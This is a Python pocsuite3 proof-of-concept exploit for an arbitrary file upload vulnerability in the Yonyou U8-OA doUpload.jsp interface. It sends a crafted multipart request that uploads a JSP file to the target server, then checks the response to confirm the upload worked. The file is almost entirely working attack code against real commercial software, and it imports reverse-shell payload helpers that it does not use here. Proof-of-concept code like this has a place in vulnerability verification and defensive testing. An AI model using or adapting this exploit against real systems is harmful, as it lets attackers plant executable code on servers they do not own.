# _*_ coding:utf-8 _*_
# @Time : 2024/2/23
# @Author: 炼金术师诸葛亮
from pocsuite3.api import Output, POCBase, register_poc, requests, logger
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD, random_str

class yongyouu8_doupload_upload(POCBase):
    pocDesc = '''用友U8-OA协同工作系统doUpload.jsp接口任意文件上传漏洞'''
    author = '炼金术师诸葛亮'
    createDate = '2024-2-23'
    name = '用友U8-OA协同工作系统doUpload.jsp接口任意文件上传漏洞'
    #title="用友U8-OA"


    def _verify(self):

        result = {}
        url = self.url+ '/yyoa/portal/tools/doUpload.jsp'

        headers = {
            "User-Agent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)",
            "Accept": "*/*",
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'close',
            "Upgrade-Insecure-Requests": "1",
            "Content-Type": "multipart/form-data; boundary=7b1db34fff56ef636e9a5cebcd6c9a75"
        }

        try:
            data = '--7b1db34fff56ef636e9a5cebcd6c9a75\r\nContent-Disposition: form-data; name="iconFile"; filename="info.jsp"\r\nContent-Type: application/octet-stream\r\n\r\n<% out.println("tteesstt1"); %>\r\n--7b1db34fff56ef636e9a5cebcd6c9a75--'

            response = requests.post(url, headers=headers, data=data)
            if response.status_code == 200 and 'jsp' in response.text:
                result['VerifyInfo'] = {}

            return self.parse_output(result)
        except Exception as e:
            pass

register_poc(yongyouu8_doupload_upload)